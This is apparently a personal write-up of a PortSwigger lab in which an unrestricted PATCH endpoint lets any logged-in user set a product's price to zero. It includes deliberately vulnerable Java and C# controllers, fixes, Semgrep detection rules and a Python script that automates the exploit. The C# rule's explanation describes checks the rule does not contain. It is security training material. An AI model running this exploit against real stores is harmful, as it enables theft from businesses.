---
title: "Lab 2: Finding and exploiting an unused API endpoint"
date: 2025-12-23
categories: [portswigger, api_testing] 
tags: [BOLA, mass_assignment]
image: portswigger.png
media_subpath: /assets/img/posts/2025-12-23-lab2_api_testing/
---

## 1. Executive Summary

**Vulnerability:** Broken Object Level Authorization (BOLA) / Mass Assignment via Hidden Method.

**Description:** The application exposes an API endpoint to retrieve product prices (`GET /api/products/{id}/price`). However, the server also accepts the `PATCH` method on this same endpoint. Because the endpoint lacks proper Access Control Lists (ACLs) or role checks, any authenticated user can modify the price of any product.

**Impact:** Business Logic Bypass. Attackers can set the price of expensive items to zero and purchase them for free.

## 2. The Attack

**Objective:** Change the price of the "Lightweight l33t Leather Jacket" to $0.00 and purchase it.

1. **Reconnaissance (Traffic Analysis):**
    - I clicked on a product and observed the API traffic in Burp Proxy.
    - I found a request: `GET /api/products/3/price`.
    - I sent this to **Repeater** and changed the method to `OPTIONS`.
    - **Response:** `Allow: GET, PATCH`. This revealed that `PATCH` is a valid action.
2. **Probe (Constraint Discovery):**
    - I tried sending a `PATCH` request immediately.
    - **Error 1:** `401 Unauthorized` -> I logged in as `wiener`.
    - **Error 2:** `415 Unsupported Media Type` -> I added header `Content-Type: application/json`.
    - **Error 3:** `400 Bad Request` ("price parameter missing") -> I added the body `{}`.
3. **Exploitation:**
    - I navigated to the target product (Leather Jacket, ID 1).
    - I constructed the final payload:
        - **Method:** `PATCH`
        - **URL:** `/api/products/1/price`
        - **Body:** `{"price": 0}`
    - I sent the request. The server responded with `200 OK`.
        
        ![image.png](image.png)
        
4. **Result:** I refreshed the page, saw the price was $0.00, added it to the basket, and completed the purchase.

## 3. Code Review

**Vulnerability Analysis (Explanation):**
The developer likely created a generic "Price Controller" to handle price logic. They implemented a `PATCH` method (perhaps for internal admin tools or future features) but forgot to restrict it to administrators. The code checks *if* the user is logged in, but not *who* the user is.

### Java (Spring Boot)

```java
@RestController
@RequestMapping("/api/products")
public class ProductPriceController {

    @Autowired
    private ProductService productService;

    // VULNERABLE: Exposed PATCH endpoint without Role checks
    @PatchMapping("/{id}/price")
    public ResponseEntity<Product> updatePrice(@PathVariable Long id, @RequestBody Map<String, Object> payload) {
        
        // The code blindly accepts the new price from the JSON body
        if (payload.containsKey("price")) {
            BigDecimal newPrice = new BigDecimal(payload.get("price").toString());
            Product product = productService.updateProductPrice(id, newPrice);
            return ResponseEntity.ok(product);
        }
        return ResponseEntity.badRequest().build();
    }
}
```

**Technical Flow & Syntax Explanation:**

- **`@PatchMapping`**: This annotation specifically handles HTTP `PATCH` requests. In REST standards, `PATCH` is used for partial updates (modifying just one field).
- **`@RequestBody Map<String, Object>`**: This binds the incoming JSON directly to a generic map. This allows the attacker to send `{"price": 0}` and have it parsed successfully without strict type checking.
- **Missing Access Control**: There is no `@PreAuthorize("hasRole('ADMIN')")` or similar check. The endpoints are public (or just require a basic user session), meaning the "Trust Boundary" is nonexistent.

### C# (ASP.NET Core)

```csharp
[ApiController]
[Route("api/products/{id}/price")]
public class PriceController : ControllerBase
{
    private readonly ProductContext _context;

    // VULNERABLE: HttpPatch attribute exposes the method
    [HttpPatch]
    [Authorize] // Only checks if user is logged in, not if they are Admin!
    public async Task<IActionResult> UpdatePrice(int id, [FromBody] PriceDto dto)
    {
        var product = await _context.Products.FindAsync(id);
        if (product == null) return NotFound();

        // Directly updating the entity from user input
        product.Price = dto.Price;
        await _context.SaveChangesAsync();

        return Ok(product);
    }
}
```

**Technical Flow & Syntax Explanation:**

- **`[HttpPatch]`**: Registers this method to handle `PATCH` verbs. If this attribute were missing, the framework would likely return `405 Method Not Allowed`.
- **`[Authorize]`**: This attribute ensures the user is authenticated (valid cookie/token). However, it does **not** enforce roles. Since `wiener` is a valid user, they pass this check.
- **`PriceDto`**: The Data Transfer Object likely contains a `public decimal Price { get; set; }` property, allowing the automatic binding of the `0` value.

### Mock PR Comment

The `updatePrice` endpoint is exposed via `PATCH` to all authenticated users. This allows customers to modify product prices.

**Recommendation:**

1. If this endpoint is not intended for public use, remove the `@PatchMapping` / `[HttpPatch]` method entirely.
2. If it is for admins only, apply strict Role-Based Access Control (RBAC) (e.g., `@PreAuthorize("hasRole('ADMIN')")`).

## 4. The Fix

**Explanation of the Fix:**
The most secure fix is to **remove unused code**. If customers never need to update prices (which they shouldn't), the code shouldn't exist. If it is an admin tool, it must require the `ADMIN` role.

### Secure Java

```java
@PatchMapping("/{id}/price")
// SECURE: Strict Role Check
@PreAuthorize("hasRole('ADMIN')")
public ResponseEntity<Product> updatePrice(@PathVariable Long id, @RequestBody PriceUpdateDto dto) {
    // Only Admins reach this line
    Product product = productService.updateProductPrice(id, dto.getPrice());
    return ResponseEntity.ok(product);
}
```

**Technical Flow & Syntax Explanation:**

- **`@PreAuthorize`**: This Spring Security annotation intercepts the request *before* the method body executes. If the user lacks the `ADMIN` authority, the server throws a `403 Forbidden` exception immediately.

### Secure C#

```csharp
[HttpPatch]
// SECURE: Require specific role
[Authorize(Roles = "Admin")]
public async Task<IActionResult> UpdatePrice(int id, [FromBody] PriceDto dto)
{
    // ... Implementation ...
}
```

**Technical Flow & Syntax Explanation:**

- **`Roles = "Admin"`**: This property within the `Authorize` attribute instructs the ASP.NET middleware to check the User's Claims. If the "Role" claim does not equal "Admin", the request is rejected.

---

## 5. Automation

*A Python script that logs in, identifies the target product, and patches the price to zero.*

```python
#!/usr/bin/env python3
import argparse
import requests
import sys

def exploit_price_change(url, username, password):
    # 1. Login to establish session (PATCH requires auth)
    s = requests.Session()
    login_url = f"{url.strip('/')}/login"

    print(f"[*] Logging in as {username}...")
    s.post(login_url, data={'username': username, 'password': password})

    # 2. Target the "Leather Jacket"
    # In a real scenario, we might scrape /api/products to find the ID.
    # Based on the lab instructions, we know the endpoint structure.
    # Let's assume ID 1 is the jacket (or passed as arg).
    product_id = 1
    target_endpoint = f"{url.strip('/')}/api/products/{product_id}/price"

    # 3. Send the PATCH request
    headers = {
        "Content-Type": "application/json"
    }
    payload = {"price": 0}

    print(f"[*] Sending PATCH to: {target_endpoint}")
    print(f"[*] Payload: {payload}")

    try:
        resp = s.patch(target_endpoint, json=payload, headers=headers)

        if resp.status_code == 200:
            print(f"[!!!] SUCCESS: Price updated to $0.00.")
            print(f"[*] Response: {resp.json()}")
            print("[*] Go to your browser, add to cart, and buy!")
        elif resp.status_code == 401:
            print("[-] Failed: Unauthorized. Login likely failed.")
        else:
            print(f"[-] Failed. Status: {resp.status_code}")
            print(f"[-] Body: {resp.text}")
            
    except Exception as e:
        print(f"[-] Connection Error: {e}")

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("url", help="Lab URL")
    ap.add_argument("username", help="Your username (wiener)")
    ap.add_argument("password", help="Your password (peter)")
    args = ap.parse_args()

    exploit_price_change(args.url, args.username, args.password)

if __name__ == "__main__":
    main()
```

## 6. Static Analysis (Semgrep)

**The Logic:We are looking for Controllers that map `PATCH` or `PUT` methods to sensitive fields (like "price", "cost", "balance") but lack explicit authorization checks (like `hasRole` or `[Authorize(Roles=...)]`).**

### Java Rule

```yaml
rules:
  - id: java-sensitive-price-update-no-auth
    languages: [java]
    message: "PATCH/PUT endpoint modifying price/cost without strict authorization"
    severity: WARNING
    patterns:
      # Find PATCH or PUT methods
      - pattern-either:
          - pattern: |
              @PatchMapping(...)
              public $RET $METHOD(...) { ... }
          - pattern: |
              @PutMapping(...)
              public $RET $METHOD(...) { ... }
      
      # That modify price/cost (either field assignment or method call)
      - pattern-either:
          - pattern: |
              $ENTITY.setPrice($VALUE);
          - pattern: |
              $ENTITY.setCost($VALUE);
          - pattern: |
              $ENTITY.price = $VALUE;
          - pattern: |
              $ENTITY.cost = $VALUE;
          - pattern: |
              $SERVICE.updatePrice(...);
          - pattern: |
              $SERVICE.updateCost(...);
      
      # Without proper authorization
      - pattern-not: |
          @PreAuthorize("hasRole('ADMIN')")
          public $RET $METHOD(...) { ... }
      - pattern-not: |
          @PreAuthorize("hasRole('MANAGER')")
          public $RET $METHOD(...) { ... }
      - pattern-not: |
          @PreAuthorize("hasAuthority('UPDATE_PRICE')")
          public $RET $METHOD(...) { ... }
```

**Technical Flow & Syntax Explanation:**

- **`@PatchMapping` / `@PutMapping`**: Identifies methods that modify data.
- **`$X.updatePrice`**: Looks for heuristic variable names or method calls inside the handler that suggest financial data modification.
- **`pattern-not`**: Flags the code *only if* the `@PreAuthorize` security annotation is missing.

### C# Rule

```yaml
rules:
  - id: csharp-patch-no-auth
    languages: [csharp]
    message: "PATCH endpoint without any authorization."
    severity: WARNING
    patterns:
      - pattern: |
          [HttpPatch]
          public $RET $METHOD(...) { ... }
      - pattern-not: |
          [HttpPatch]
          [Authorize(...)]
          public $RET $METHOD(...) { ... }
```

**Technical Flow & Syntax Explanation:**

- **`[HttpPatch]`**: Identifies the attack vector (the update method).
- **`$ENTITY.Price = ...`**: Matches code lines where a property named "Price" is being assigned a value, indicating critical business data.
- **`pattern-not`**: Ensures we ignore secure controllers that explicitly define `Roles` in their authorization attribute.
